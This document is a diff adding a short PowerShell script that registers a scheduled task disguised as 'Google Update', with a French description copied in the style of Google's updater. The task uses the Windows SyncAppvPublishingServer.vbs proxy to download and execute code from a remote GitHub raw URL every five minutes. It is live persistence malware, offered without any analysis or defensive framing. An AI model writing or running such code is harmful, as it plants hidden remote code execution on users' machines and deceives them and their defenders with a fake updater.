@@ -1,0 +1,4 @@
+$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\SyncAppvPublishingServer.vbs" -Argument '"Break; iex(iwr -usebasicparsing https://github.com/1l1l1l1l/1j1j1j1j/raw/main/4)"';
+$timespan = New-TimeSpan -Minutes 5;
+$trigger = New-ScheduledTaskTrigger -Once -At 06:30 -RepetitionInterval $TimeSpan;
+Register-ScheduledTask -Action $action -TaskName "Google Update" -Description "Maintient de Google. Si cette tâche est désactivée ou arrêtée, votre Google n'est pas mis à jour, ce qui signifie que les potentielles failles de sécurité peuvent ne pas être corrigées et que certaines fonctionnalités risquent de ne pas être opérationnelles. Cette tâche se désinstalle d'elle-même si aucun logiciel Microsoft ne l'utilise." -Trigger $trigger;
